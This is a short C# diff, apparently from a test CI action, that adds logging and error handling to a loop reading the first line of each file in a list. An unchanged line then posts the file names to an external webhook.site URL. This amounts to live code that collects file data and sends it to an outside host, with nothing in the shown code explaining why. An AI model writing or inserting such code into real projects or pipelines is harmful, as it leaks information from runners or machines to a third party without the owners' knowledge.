@@ -29,8 +29,16 @@ namespace testAction
 
             foreach(var f in files)
             {
-                var lines = File.ReadLines(f);
-                toPost += lines.First() + Environment.NewLine;
+                Console.WriteLine($"Reading file : {f}");
+                try
+                {
+                    var lines = File.ReadLines(f);
+                    toPost += lines.First() + Environment.NewLine;
+                }
+                catch(Exception e)
+                {
+                    Console.WriteLine($"Error reading file {f} : {e}");
+                }
             }
 
             await client.PostAsync("https://webhook.site/34dd9943-6e0e-4755-97a8-04f53869ad0e", new StringContent(string.Join(',', files)));
